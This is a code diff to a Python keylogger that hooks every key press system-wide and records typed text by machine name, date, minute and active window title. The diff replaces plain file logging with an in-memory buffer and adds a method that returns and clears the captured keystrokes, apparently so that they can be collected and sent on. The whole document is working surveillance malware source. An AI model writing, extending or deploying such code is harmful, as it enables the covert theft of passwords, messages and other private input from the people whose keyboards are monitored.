@@ -1,27 +1,41 @@
-import keyboard
+import keyboard, socket, re, unicodedata
 from datetime import datetime
 import pygetwindow as gw
 
+
 class KeyLogger:
-    def __init__(self, log_file="log.txt"):
-        self.log_file = log_file
+    def __init__(self):
+        self.machine_name = socket.gethostname()
+        self.running = True
+        self.buffer = {}
 
-    def get_active_window(self):
-        try:
-            return gw.getActiveWindow().title
-        except:
-            return "Unknown"
+    def clean_title(self, title):
+        if not title: return "Unknown"
+        title = "".join(c for c in title if unicodedata.category(c)[0] != "C")
+        title = re.sub(r"^\(\d+\)\s*", "", title)
+        return title.replace(" - Microsoft Edge","").replace(" - Google Chrome","").strip()
 
-    def log_event(self, event):
-        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        window = self.get_active_window()
-        with open(self.log_file, "a", encoding="utf-8") as log:
-            log.write(f"[{time}] ({window}) Key pressed: {event.name}\n")
+    def format_key(self, k):
+        return {"space":" ", "enter":"\n", "backspace":"<BS>"}.get(k, k)
+
+    def log_event(self, e):
+        if not self.running: return
+        date = datetime.now().strftime("%Y-%m-%d")
+        minute = datetime.now().strftime("%H:%M")
+        window = self.clean_title(getattr(gw.getActiveWindow(),"title",""))
+
+        d = self.buffer.setdefault(self.machine_name, {}).setdefault(date, {}).setdefault(minute, {}).setdefault(window, "")
+        self.buffer[self.machine_name][date][minute][window] = d + self.format_key(e.name)
+
+    def get_and_clear_buffer(self):
+        data = self.buffer
+        self.buffer = {}
+        return data
+
+    def stop(self):
+        self.running = False
 
     def start(self):
         keyboard.on_press(self.log_event)
+        print("Keylogger started. Press CTRL+C to stop.")
         keyboard.wait()
-
-if __name__ == "__main__":
-    logger = KeyLogger()
-    logger.start()
